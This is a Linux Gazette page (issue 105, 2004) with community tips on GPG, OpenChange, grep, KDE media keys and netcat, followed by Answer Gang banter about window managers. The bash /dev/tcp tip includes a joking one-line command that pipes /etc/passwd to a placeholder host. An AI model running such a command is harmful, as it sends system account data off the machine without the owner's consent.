<FONT COLOR="navy">Front and Back: KPGP and GPG</FONT></H3>
Richard Bos (<a href="mailto:tag@lists.linuxgazette.net?cc=radoeka@xs4all.nl&subject=%20Re%3A%20%5BLG%20105%5D%202c%20Tips%20%234">radoeka from xs4all.nl</a>)


<P>
[sent as Tip on Advice of Jimmy O'Regan]
</P>
<P>
Thanks for your kgpg article, it pointed me to the --editkey + adduid/deluid
commands, that I was looking for - for some time.
</P>
<P>
Hello Linux-ers,
</P>
<P>
I wrote something down last week, answering my own questions that I had.
</P>
<P><DL><DT>
It explains how to deal with signing rpm packages.  The webpage is located at:
<DD><A HREF="http://linux01.gwdg.de/apt4rpm/signing.html"
	>http://linux01.gwdg.de/apt4rpm/signing.html</A>
</DL></P>
<P>
I hope you can benefit from it.
</P>
<P>
--
Kind regards,
Richard Bos
</P>

<blockquote><code><font color="#000033"><br>Without a home the journey is endless
</font></code></blockquote>

<!-- end 4 -->
<!--     .~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.     -->
<P> <A NAME="tips.5"><HR WIDTH="75%" ALIGN="center"></A> <P>
<H3><IMG ALIGN=BOTTOM ALT="" SRC="../gx/lil2cent.gif">
<FONT COLOR="navy">OpenChange</FONT></H3>
Jimmy O'Regan (<a href="mailto:tag@lists.linuxgazette.net?cc=jimregan@o2.ie&subject=%20Re%3A%20%5BLG%20105%5D%202c%20Tips%20%235">The <em>LG</em> Answer Gang</a>)


<P>
OpenChange is a project to reverse engineer all things MS Exchange. They
have a program for dumping the contents of an Exchange database, and are
working on the Exchange protocol, with a view to creating an open source
Exchange clone.
</P>
<P>
<A HREF="http://openchange.althost.net/index.php?page=openEDB"
	>http://openchange.althost.net/index.php?page=openEDB</A>
</P>
<BLOCKQUOTE>
[John Karns] 
Interesting.  Not that I use it, but was intrigued when I noticed that HP
had done similarly 3 or 4 years back (Openmail, I think), and were
offering it gratis for non-commercial use - in closed source format IIRC.
They soon killed it though, no doubt after being pressured by Redmond.
</BLOCKQUOTE>
<BLOCKQUOTE>
[Rick Moen] 
"I'm not dead yet!"
</BLOCKQUOTE>

<blockQuote><ul>
<LI><A HREF="http://samsungcontact.com/en"
	>http://samsungcontact.com/en</A>

<LI><A HREF="http://www.scalix.com"
	>http://www.scalix.com</A>
</ul></blockQuote>
<BLOCKQUOTE>
Both of those are the Openmail codebase.
</BLOCKQUOTE>
<BLOCKQUOTE>
More at:  "Groupware" on <A HREF="http://linuxmafia.com/kb/Mail"
	>http://linuxmafia.com/kb/Mail</A>
</BLOCKQUOTE>

<!-- end 5 -->
<!--     .~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.     -->
<P> <A NAME="tips.6"><HR WIDTH="75%" ALIGN="center"></A> <P>
<H3><IMG ALIGN=BOTTOM ALT="" SRC="../gx/lil2cent.gif">
<FONT COLOR="navy">SCP server for Windows (98/2k)</FONT></H3>
Jay R. Ashworth (<a href="mailto:tag@lists.linuxgazette.net?cc=jra@baylink.com&subject=%20Re%3A%20%5BLG%20105%5D%202c%20Tips%20%236">jra from baylink.com</a>)


<P>
I've found Caspian's package, but he says he doesn't think it will work
with SCP due to banners and such.
</P>
<P>
Does anyone have, in-pocket, an SCP compatible SSHD for Windows 98/NT/2K
that's as easy to install as the Caspian package?
</P>
<P>
(looks at sshwindows.sf.net)
</P>
<P>
nevermind.  
<IMG SRC="../gx/dennis/smily.gif" ALT=";-)" 
		height="24" width="20" align="middle">
</P>
<P>
Cheers,
jra
</P>

<!-- end 6 -->
<!--     .~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.     -->
<P> <A NAME="tips.7"><HR WIDTH="75%" ALIGN="center"></A> <P>
<H3><IMG ALIGN=BOTTOM ALT="" SRC="../gx/lil2cent.gif">
<FONT COLOR="navy">Slackware retrospective</FONT></H3>
Mike Orr (<a href="mailto:tag@lists.linuxgazette.net?cc=tag@lists.linuxgazette.net, bytes@lists.linuxgazette.net&cc=mso@oz.net&subject=%20Re%3A%20%5BLG%20105%5D%202c%20Tips%20%237"><em>LG</em> Contributing Editor</a>)



<blockquote><font color="#000066">For you history buffs out there.
 -- Heather</font></blockquote>
<P>
LWN article about <A HREF="http://www.slackware.org/">Slackware</A> 10, reminiscing about the distribution
that "has outlived all its predecessors":
<A HREF="http://lwn.net/Articles/91467"
	>http://lwn.net/Articles/91467</A>
</P>
<P><DL><DT>
A look at the evolution of Linux distributions:
<DD><A HREF="http://lwn.net/Articles/91371"
	>http://lwn.net/Articles/91371</A>
</DL></P>

<!-- end 7 -->
<!--     .~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.     -->
<P> <A NAME="tips.8"><HR WIDTH="75%" ALIGN="center"></A> <P>
<H3><IMG ALIGN=BOTTOM ALT="" SRC="../gx/lil2cent.gif">
<FONT COLOR="navy">Triggering one of several options with Juk and KHotkeys</FONT></H3>
Jimmy O'Regan (<a href="mailto:tag@lists.linuxgazette.net?cc=jimregan@o2.ie&subject=%20Re%3A%20%5BLG%20105%5D%202c%20Tips%20%238">The <em>LG</em> Answer Gang</a>)


<P>
I posted a story on <A HREF="http://dot.kde.org"
	>http://dot.kde.org</A> mentioning that LG has two <A HREF="http://www.kde.org/">KDE</A>
related articles this month, and someone asked how to have multiple
possible actions attached to a single key - launch Juk if it isn't
running, pause if playing and vice versa, and play if stopped. This
script does that:
</P>
<p align="center">See attached <tt><a href="misc/tips/juk.bash.txt">juk.bash.txt</a></tt></p>
<BLOCKQUOTE>
[Ben] 
Intermediate-level shell tip for the above situation:
</BLOCKQUOTE>

<blockquote><pre>ps aux|grep '[j]uk'
</pre></blockquote>
<BLOCKQUOTE>
Will ignore the 'grep' line every time. Why? Well...
</BLOCKQUOTE>

<blockquote><pre>ben@Fenrir:~$ find / [f]oo &gt; /dev/null 2&gt;&amp;1 &amp;
[1] 8099
ben@Fenrir:~$ ps --pid 8099
  PID TTY          TIME CMD
 8099 pts/0    00:00:02 find / [f]oo
</pre></blockquote>
<BLOCKQUOTE>
Note that 'ps' lists the command exactly as invoked - square brackets
and all. 'grep' itself, however, <EM>interprets</EM> the square brackets as a
character class: that is, it looks for a match for any character(s)
contained within the brackets. Since the only character within the
brackets is 'f',  '[f]oo' is interpreted simply as 'foo'. As a result,
'grep' is searching for 'foo' - but the 'grep' line itself, as listed by
'ps ax', does not contain 'foo'; it contains '[f]oo', which does not
match.
</BLOCKQUOTE>
<BLOCKQUOTE>
The concept is a bit difficult to understand the first time, obvious -
and handy! - forever after. 
<IMG SRC="../gx/dennis/smily.gif" ALT=":)" 
		height="24" width="20" align="middle">
</BLOCKQUOTE>
<P><STRONG>
I'd forgotten this; handy.  Only works, of course, if the argument to
grep is a literal.  Well, more accurately, it's even harder to
understand (and possibly might break other things) if you put it in a
variable...
</STRONG></P>
<BLOCKQUOTE>
[Ben] 
You're right: it can be made to work but would Not Be Conducive to
Understanding. Something like
</BLOCKQUOTE>

<blockquote><pre># <a href="http://okopnik.freeshell.org/acronyms.cgi?string=YANETUT">YANETUT</a> 
first=${var:0:1}
last=${var:1}
ps ax|grep "[$first]$last"
</pre></blockquote>
<BLOCKQUOTE>
Ugh.
</BLOCKQUOTE>

<!-- end 8 -->
<!--     .~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.     -->
<P> <A NAME="tips.9"><HR WIDTH="75%" ALIGN="center"></A> <P>
<H3><IMG ALIGN=BOTTOM ALT="" SRC="../gx/lil2cent.gif">
<FONT COLOR="navy">Using Windows Keyboard Media Buttons In Linux</FONT></H3>
john frey (<a href="mailto:tag@lists.linuxgazette.net?cc=iaargh@shaw.ca&subject=%20Re%3A%20%5BLG%20105%5D%202c%20Tips%20%239">iaargh from shaw.ca</a>)


<P>
For years now I have been staring at the extra keys on my Logitech Freedom
Optical with despair in my heart.  I told myself I did not really need them,
but somehow I felt less than a windows drone because I paid the money for a
cordless keyboard and mouse and did not have full function.
</P>
<P>
Then I read this article, tried a few of the hotkeys for launching email, web
browser and local file browser.  That was all very neat but what i really
wanted was to use the dial on the keyboard for volume control.  My speakers
have buttons to push for volume control but they are clunky and response is
slow, using a slider on Kmix is equally unwieldy.  When the email
notification suddenly blares out (because I just finished watching a movie
and forgot to lower the sound) I want to turn the sound down before the last
tones fade out.
</P>
<P>
I muddled about in the <A HREF="http://www.kde.org/">KDE</A> control centre a bit with not much success then hit
on the astounding idea that maybe I could configure this from Kmix.  Right
click on the master volume control -&gt; define keys......a few short clicks
later and I had the dial working to raise and lower sound and the mute button
as well.  I felt f***n great.  Can you say eeeasssy, can you say in-tui-tive?
Wow, this is really the cats pajamas!
</P>
<P>
Sometimes the smallest things just make life worth living again ;~)
</P>

<!-- end 9 -->
<!--     .~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.     -->
<P> <A NAME="tips.10"><HR WIDTH="75%" ALIGN="center"></A> <P>
<H3><IMG ALIGN=BOTTOM ALT="" SRC="../gx/lil2cent.gif">
<FONT COLOR="navy">Telnet's nice, netcat's better</FONT></H3>
Flavio Poletti (<a href="mailto:tag@lists.linuxgazette.net?subject=%20Re%3A%20%5BLG%20105%5D%202c%20Tips%20%2310">anonymous</a>)


<!-- ::
Telnet's nice, netcat's better
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
plus, <TT>/dev/tcp</TT> bashing
:: -->
<P><STRONG>
Sending some network traffic from the shell.
</STRONG></P>
<P><STRONG>
Some time ago (actually, <EM>a long time ago</EM>) I needed to send some TCP
traffic towards a host on a regular basis. So... the only tool I knew was
telnet, I had no clue about socket programming, and I had to study expect
in order to get the job done. No need to say, it was a real pain - what
else should I <TT>/expect/?</TT> (For those who don't know what I'm talking about,
I suggest to perform more-than-trivial interaction with some server on
ports other than the telnet one).
</STRONG></P>
<P><STRONG>
Some time later, I learnt socket programming, so I was able to do the job
inside C and call my program from the shell. But you can bet on it - it
was some very focused application and proved to give me no help in a
similar-but-different context.
</STRONG></P>
<P><STRONG>
It was then that I discovered netcat.
</STRONG></P>
<P><STRONG>
netcat (actually the executable should be called nc) is what I needed,
plus much more. It is capable of running in both client and server
(listening) mode, to cope with both TCP and UDP, and provides the more
straightforward concept you could ask for: it reads standard input and
sends it to the remote destination, and gives you the incoming traffic on
the standard output. Quite nice, isn't it? netcat should be already
available in your Linux box, anyway you can download it here:
<A HREF="http://www.atstake.com/research/tools/network_utilities"
	>http://www.atstake.com/research/tools/network_utilities</A>
</STRONG></P>
<P><STRONG>
I was very proud of my discovery (only 5-6 years of research!) when
recently I had to find something that - quite surprising to me - was even
simpler. I mean, to solve my ancient two-nights-without-sleep problem I
didn't even need an external program! I found that what I needed can be
done entirely inside the shell, provided that you're using bash - and all
of us are using bash, aren't we?
</STRONG></P>
<P><STRONG>
This is the trick: bash defines some fake devices which you can use as
files for redirection - but you actually get some IP traffic with them! So
you can send your passwd file to your worst enemy at example.com simply by
issuing this command:
</STRONG></P>
<P><STRONG><CODE>
cat /etc/passwd &gt; /dev/tcp/example.com/10000
</CODE></STRONG></P>
<P><STRONG>
(we all know that our worst enemy accepts passwd files listening to port
10000)
</STRONG></P>
<P><STRONG>
That's it - and you can do that with UDP as well! If you want to find out
more, take a look at the Bash Advanced Scripting Guide, in particular
paragraph 28.1 (<A HREF="http://www.tldp.org/LDP/abs/html/devref1.html"
	>http://www.tldp.org/LDP/abs/html/devref1.html</A>).
</STRONG></P>
<P><STRONG>
This is my 2c Tip!
</STRONG></P>
<HR width="10%" align="center"><P><STRONG>
I tried to seek inside <TT>/dev</TT> to see if there is any tcp or udp device,
but found neither - that's why I claim that these devices are
bash-interpreted. If you know more about this... correct please!
</STRONG></P>

<blockquote><font color="#000066">The Editor's Scissors had a grand time with this one.
 -- Heather</font></blockquote>

<font color="#660000"><blockquote>They're not defined by the shell, nor are they related to it -- they're
just named FIFOs that the kernel defines are virtual when a port needs
to be listened on.
 -- Thomas</blockquote></font>
<BLOCKQUOTE>
[Jason Creighton] 
Quoting from the bash manpage:
</BLOCKQUOTE>

<blockquote><pre>       Bash  handles  several  filenames  specially  when  they  are  used  in
       redirections, as described in the following table
</pre></blockquote>
<BLOCKQUOTE>
[Ben] ben@Fenrir:~$ ls -l <TT>/dev/tcp</TT><br>
ls: <TT>/dev/tcp:</TT> No such file or directory
</BLOCKQUOTE>
<BLOCKQUOTE>
The Talmud, I mean the "bash" man page, offers no further help; however,
the Commentaries... err, <TT>/usr/src/linux/Documentation/devices.txt</TT>, says
these are iBCS-2 compatability devices...
</BLOCKQUOTE>
<BLOCKQUOTE>
So, I made these nodes - with a little help from Perl:

<pre>
ben@Fenrir:/usr/src/linux/Documentation$ su
Password:
root@Fenrir:/usr/src/linux/Documentation# mkdir /dev/inet
root@Fenrir:/usr/src/linux/Documentation# perl -wne'
if(m#0 = /dev/socksys#../raw/){/(\d+) = ([^\s]+)/;
system"mknod -m 0664 $2 c 30 $1; chgrp dialout $2"}
' devices.txt
root@Fenrir:/usr/src/linux/Documentation# perl -wlne'
if (m#/dev/ip #../X0R/){/([^\s]+) -&gt; ([^\s]+)/;
system"ln -s $2 $1"}' devices.txt
</pre>

Group "dialout" allows its members to use those devices.
</BLOCKQUOTE>
<BLOCKQUOTE>
In the next invocation, I selected the second group from above and
created the symlinks by using much the same mechanism.
</BLOCKQUOTE>
<BLOCKQUOTE>
So, after all of that - will the stuff promised by the Bash man page
work?
</BLOCKQUOTE>

<blockquote><pre>ben@Fenrir:~$ su -c 'thttpd -d ~ben/www'
ben@Fenrir:~$ cat /dev/tcp/localhost/80
cat: /dev/tcp/localhost/80: Not a directory
ben@Fenrir:~$ nc /dev/tcp/localhost/80
/dev/tcp/localhost/80: forward host lookup failed: Unknown host
</pre></blockquote>
<BLOCKQUOTE>
[Kapil] 
I assume you are really <A HREF="http://www.debian.org/">Debian</A>ized. So quoting from
/usr/share/doc/bash/README.Debian.gz:
</BLOCKQUOTE>

<blockquote><pre>	9. Why is bash configured with --disable-net-redirections?

	    It can produce completely unexpected results. This kind of
	    feature should not be part of a shell but a special. tool. And
	    that tool has existed for years already, it's called netcat.
</pre></blockquote>

<blockquote><font color="#000066">And that brings us back around to Flavio's pleased discovery 
<IMG SRC="../gx/dennis/smily.gif" ALT=":)" 
		height="24" width="20" align="middle">
 -- Heather</font></blockquote>
<BLOCKQUOTE>
[Jason] 
So, if you were going to use this silly little bash trick instead of
netcat, you would do something like this:
</BLOCKQUOTE>

<blockquote><pre>~$ cat /dev/tcp/localhost/25
cat: /dev/tcp/localhost/25: No such file or directory
~$ cat &lt; /dev/tcp/localhost/25
220 jpc.example.com ESMTP Exim 4.20 Fri, 16 Jul 2004 16:32:55 -0600
</pre></blockquote>
<BLOCKQUOTE>
I don't think it's possible to set up a bidirectional link via this
method, like you can with netcat. Or perhaps there's some Really Clever
Shell Tricks you can use to get cat's stdin and stdout hooked up to the
fd in order for you to, for example, interact with an SMTP server. But I
honestly don't care if you can do this, because it is, as you say...
easier and nicer not to do this sort of thing in the shell.
</BLOCKQUOTE>

<!-- end 10 -->
<hr>
<CENTER><Font face="Helvetica"><STRONG>
This page edited and maintained by the Editors of <I>Linux Gazette</I><br>HTML script maintained by <A HREF="mailto:star@starshine.org">Heather Stern</a> of Starshine Technical Services, <A HREF="http://www.starshine.org/">http://www.starshine.org/</A>
</STRONG></Font></CENTER>
<hr>

</p>



<!-- *** BEGIN author bio *** -->
<!-- *** END author bio *** -->




<div id="articlefooter">




<p>
Published in Issue 105 of Linux Gazette, August 2004
</p>

</div>

</div>


<div class="content lgcontent">

<a name="lg_answer"></a>
<h1>The Answer Gang</h1>


</b>
</p>


<p>
<!--startcut  ==============================================-->
<!-- *** BEGIN HTML header *** -->
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
<HTML><HEAD>
<META NAME="generator" CONTENT="lgazmail v1.4G.t">
<TITLE>Linux Gazette 105: The Answer Gang (TWDT)</TITLE><link href="../lg.css" rel="stylesheet" type="text/css" media="screen,
projecti
+on"  />
<title>The Answer Gang 105: </title>
<style type="text/css" media="screen, projection">
<!--
.articlecontent {
        position:absolute;
        top:143px;
}
-->
</style>

</HEAD><BODY BGCOLOR="#FFFFFF" TEXT="#000000" LINK="#0000FF" VLINK="#0000AF"
ALINK="#FF0000">
<!-- *** END HTML header *** -->
<!--endcut  ==============================================-->
<TABLE width="100%" BORDER><TR><TD WIDTH="200">
<A HREF="http://linuxgazette.net/">
<IMG ALT="LINUX GAZETTE" SRC="../gx/2002/lglogo_200x41.png" 
	WIDTH="200" HEIGHT="41" border="0"></A>
<BR CLEAR="all">
<SMALL>...<I>making Linux just a little more fun!</I></SMALL>
</TD><TD>
<div class="content articlecontent">
<center>
        <img src="../gx/dennis/qbubble.gif" alt="(?)"                           
	                border="0" align="left">
<A NAME="answer"><BIG><BIG><STRONG><FONT COLOR="maroon"
	>The Answer Gang</FONT></STRONG></BIG></BIG></a>
	<img src="../gx/dennis/bbubble.gif" alt="(!)"                           
	                border="0" align="right"><BR>
<STRONG>By Jim Dennis, Karl-Heinz Herrmann, Breen, Chris, and...
        (<a href="../tag/bios.html">meet the Gang</a>) ...
	        the Editors of <i>Linux Gazette</i>...
		        and 
			<a href="../tag/ask-the-gang.html">You</a>! 
</STRONG></BIG> </TD></TR>
</TABLE>
<P>

<!-- END header -->

<center><p>
<br>We have guidelines for <a href="../tag/ask-the-gang.html">asking</a> and <a
href="../tag/members-faq.html">answering</a> questions.  Linux questions only, please.
</STRONG>
<br><em><font color="#7F0000">We make <b>no guarantees</b> about answers, but you can be <b>anonymous</b> on request.</font></em>
<br>See also: The Answer Gang's 
<a href="../tag/kb.html">Knowledge Base</a>
and the <i>LG</i> 
<a href="http://linuxgazette.net/search.html">Search Engine</a>
</center>
<br></p></center>

<HR>
<!-- BEGIN message -->
<H3>Contents:</H3>
<dl>
<dt><a href="#tag/greeting"
	><strong>&para;: Greetings From Heather Stern</strong></A></dl>

<DL>
<!-- index_text begins -->
<dt><A HREF="#tag.1"
	><img src="../gx/dennis/qbub.gif" height="28" width="50"
	  alt="(?)" border="0"
	></a>One for Ben --or--
<dd><A HREF="#tag.1"
	><strong>Which Window Manager?</strong></a>
<br>.
<dt><A HREF="#tag.2"
	><img src="../gx/dennis/qbub.gif" height="28" width="50"
	  alt="(?)" border="0"
	><strong>Experimenting with window managers</strong></a>
<dt><A HREF="#tag.3"
	><img src="../gx/dennis/qbub.gif" height="28" width="50"
	  alt="(?)" border="0"
	><strong>Kernel 2.6 and PCMCIA troubles</strong></a>
<dt><A HREF="#tag.4"
	><img src="../gx/dennis/qbub.gif" height="28" width="50"
	  alt="(?)" border="0"
	><strong>Sending a keystroke to remote application</strong></a>
<!-- index_text ends -->
</DL>
<!--     .~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.     -->
<A NAME="tag/greeting"><HR WIDTH="75%" ALIGN="center"></A>
<H3 align="left"><img src="../gx/dennis/hbubble.gif" 
	height="50" width="60" alt="(&para;) " border="0"
	>Greetings from Heather Stern</H3>
<!-- begin hgreeting -->
<p>
Greetings, everyone, and welcome once more to the world of The Answer Gang.
Please pardon our dust;  the buzz saws of open sorcery have been busy and there's floor clippings from the busy Editor's Scissors, too.
</p>

<p>
Still, we sincerely hope you enjoy the bits we have for you this time around - juicier than watermelon (hey, now there's a good name for a window manager), bigger than a double burger.
</p>

<p>
I'm really looking forward to Linux World Expo this month (what am I saying? this <em>week</em>) as I'll get to see a lot of friends there.  In addition to the obvious parties and Dot Org Pavilion, I'll be keeping my eye out for the booths with a spirit of fun in mind, who's really solving problems that face the enterprise scale (now that I've worked with larger clients this last year), and who's really helping the utter newbie.
</p>

<p>
People switching to Linux during site upgrades are probably the largest growing aspect of Linux use now that thare are so many flavors of MS Windows they're just as confusing as the wide variety of distributions we've got.  In the last year I've been seeing ads for Linux on ordinary television, too - it's even led to some clients here and there.  So just in case anyone was wondering, Tux is going places.  Whether any of those places are what the analysts want to see... ah well, this is what worldwide expos are for, to tell the analysts what to look for.
</p>

<p>If any of you would like to send in your own views of how things went at the LWE (I understand there's one going on in the UK too?  Any more big events out there?) ... oh yeah!  Birthday party time.  I almost forgot about the Linux Picnix, and considering it's right in my area, there's no way I'm gonna miss that.  <em>*ahem*</em>  If anyone wants to send us some reports on how they've enjoyed any Linux events this month, I'd love to put together a thread about 'em.  If you're going to the same ones I am... look for my red straw hat!  I'll see you there!
</p>

<p>
More next month about what Tux has been up to during his Summer vacation. 
</p>
<!-- end hgreeting -->
<!--     .~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.     -->
<A NAME="tag.1"><HR WIDTH="75%" ALIGN="center"></A>
<!-- begin 1 -->
<H3 align="left"><img src="../gx/dennis/qbubble.gif" 
	height="50" width="60" alt="(?) " border="0"
	>Which Window Manager?</H3>
<H4 ALIGN="center">.</H4>


<p><strong>From Jimmy O'Regan 
</strong></p> 
<p></strong></p>
<!-- ::
Which Window Manager?
~~~~~~~~~~~~~~~~~~~~
.
:: -->

<p align="right"><strong>Answered By:  Jason Creighton, Thomas Adam, Ben Okopnik, Kapil Hari Paranjape
</strong></p>
<P><STRONG>
Perl Linux. A distribution where everything, except the kernel and Perl,
is written in Perl.
</STRONG></P>
<P><STRONG>
<A HREF="http://perllinux.sourceforge.net"
	>http://perllinux.sourceforge.net</A>
</STRONG></P>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Jason] 
LUFS (Linux Userspace File Systems):
</blockQuote>
<blockQuote><BLOCKQuote>
<A HREF="http://lufs.sourceforge.net/lufs"
	>http://lufs.sourceforge.net/lufs</A>
</BLOCKQuote></blockQuote>
<blockQuote>
It's designed to allow you to write filesystem drivers for linux in
userspace. (You'd never guess it from the name. 
<IMG SRC="../gx/dennis/smily.gif" ALT=":-)" 
		height="24" width="20" align="middle"> )
</blockQuote>
<blockQuote>
Bindings for python:
</blockQuote>
<blockQuote><BLOCKQuote>
<A HREF="http://www.freenet.org.nz/python/lufs-python"
	>http://www.freenet.org.nz/python/lufs-python</A>
</BLOCKQuote></blockQuote>
<blockQuote>
I don't know of there's any for Perl, but I wouldn't be surprised.
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Ben] 
Wow. Weird. I'm very familiar with the Perl Power Tools (essentially,
the GNU toolkit for Unix reimplemented in Perl) - in fact, I recommend
them to my students as a bunch of well-written code to study; I also
think it's a really good idea of the same kind as having a
statically-compiled shell. An entire Perl-based distro, though? Is there
a <EM>point</EM> to straining a Camel [1] through the eye of a needle? I mean,
cool that it can be done... but you end up with pureed camel, and who
wants that?  Messy.
</blockQuote>
<blockQuote>
[1] Contrary to popular belief, the mascot's name is <EM>not</EM> "OCaml".
Sheesh.
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Thomas] 
Depends how you say it. 
<IMG SRC="../gx/dennis/smily.gif" ALT=":)" 
		height="24" width="20" align="middle"> Usually with perl, it is with heavy surprise
with lots of skepticism thrown in for good measure. 
<IMG SRC="../gx/dennis/smily.gif" ALT=":D" 
		height="24" width="20" align="middle">
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Ben] 
Well, the way people seems to usually "learn" Perl (i.e., by looking at
somebody's horrible code, figuring "I can do that!", and proceeding to
do <EM>exactly</EM> that), I'd think it's more like "prayerfully, with a quiver
in the voice and tears running down the cheeks". People who learn it the
right way - i.e., by reading and following the documentation and learning
from <EM>good</EM> examples (e.g., PPT, NMS (<A HREF="http://nms-cgi.sourceforge.net"
	>http://nms-cgi.sourceforge.net</A>),
etc.) - say it with a rising inflection, sorta singing the last part,
and usually follow it up with a whistle.
</blockQuote>
<blockQuote>
"O Caaaa-mel! [whistle] Heeere, Camel-camel-camel!"
</blockQuote>
<blockQuote>
It always comes running and wagging its tail when properly invoked.
Beware the fleas, though. 
<IMG SRC="../gx/dennis/smily.gif" ALT=":)" 
		height="24" width="20" align="middle">
</blockQuote>
<HR width="10%" align="left">
<font color="red"><blockquote><em>Snipping some light-heartedness, somehow the topic changed to window
managers.
 -- Thomas Adam</em></blockquote></font>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Thomas] 
Don't use <A HREF="http://www.kde.org/">KDE</A>, then.
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Ben] 
It's certainly one of the major reasons that I don't. My current machine
has plenty of disk, memory, and CPU for KDE to gratuitously throw in the
trash (oops - was that my 'out-loud' voice? Darn), but I refuse to put
up with the Micr0s0ft-style blinkenlights philosophy of the interface
("Fear not, small human creature; KDE has decided on everything you'll
want and need, and will provide it for you.").
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Thomas] 
It does have "wizards" or the equivalent so that even the complete
clueless can give it a go.
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Ben] 
What, to handle the configuration end? Nothing special there; IceWM,
e.g., has "icepref" that does much the same thing. I'm very much a fan
of "vi" as a configuration wizard, myself, but others may differ.
</blockQuote>
<blockQuote>
I dislike the standard RedHat install for the same reasons (it's a minor
dislike, but that's the reason for it.)
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Thomas] 
<EM>sigh</EM>. I agree. I liked it more when RH4 and the subsequent RH5 release
used Fvwm. They now use Gnome, which is arguably better IMO, than KDE.
Qt is horrible.
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Ben] 
IceWM is small, fast, and lacks nothing in features that I want from a
WM. From Thomas' previous rantings 
<IMG SRC="../gx/dennis/smily.gif" ALT=":)" 
		height="24" width="20" align="middle">, I gather that FVWM is much the
same sort of thing. It's like having a spoon that you bought for a
quarter; [ ... ]
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Thomas] 
Kind of. But there are a <EM>lot</EM> of things Fvwm does that IceWM does not,
and while I am not going to outline the individual merits of each, you
cannot, for instance, in IceWM do event actions. And while I have used
IceWm, it just doesn't have..., well, it lacks <EM>something</EM>. 
<IMG SRC="../gx/dennis/smily.gif" ALT=":)" 
		height="24" width="20" align="middle">
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Ben] 
EPID. That's why I didn't say that KDE was evil and should be wiped off
the face, etc. - some people love it. And FVWM doesn't have a lot of
things that IceWM has (i.e., a decent taskbar; I could never stand that
huge <EM>thing</EM> they use that takes up so much real estate.)
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Thomas] 
Actually, Fvwm provides a taskbar (FvwmTaskBar) that takes up no more
space than any "normal" task bar, plus it can autohide.
You can also configure FvwmIconMan to act as a taskbar.
</blockQuote>
<blockQuote>
Apart from the inherent motif theme [1] that Fvwm takes on by default (
\o/ ), perhaps the other major attraction to it for me was the fact that
you can define events based on actions. AFAICT this is an idiom unique
to Fvwm, and no other WM/desktop environment (The module that provides
this is known as 'FvwmEvent').
</blockQuote>
<blockQuote>
Perhaps another addition that you might appreciate Ben is the fact that
you can script commands to Fvwm, using the underlying $SHELL. There is
even a full set of perl-bindings[2] [3]. The power that this gives, to
allow complex things to be done simply, is quite amazing. Not only that
but Fvwm has its own internal widget set (FvwmScript) so that you can
define all kinds of things.
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Ben] 
Perhaps I'm just not visualizing a scenario where this would be useful,
but I can't really see the advantage. What WM functions would you want
to script, and why?
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Thomas] 
Lots of reasons that are situation dependent. One is to do things like
compute the distance between windows and slide a window in a given
direction to sit beside the window. Another is to take a snapshot of the
window on iconify, and set the icon to the picture of the window.
</blockQuote>
<blockQuote>
For example, I have a function in Fvwm that displays the total number of
windows that I have open, on the title for my pager. By "open", I mean
those windows that are not iconified. You can see it here [4]. You
probably couldn't do that easily in anyother WM. Whether or not you
would <EM>want</EM> to, is another question entirely. 
<IMG SRC="../gx/dennis/smily.gif" ALT=":)" 
		height="24" width="20" align="middle">
</blockQuote>
<blockQuote>
<IMG SRC="../gx/dennis/bbub.gif" ALT="(!)"
	HEIGHT="28" WIDTH="50" BORDER="0"
	> [Ben] 
Yes. *That*' is the question I'm asking. If I really needed to, I'd
parse the output of "xwininfo -root -tree" and get the information, but
I don't see how it would benefit me in either case.
</blockQuote>
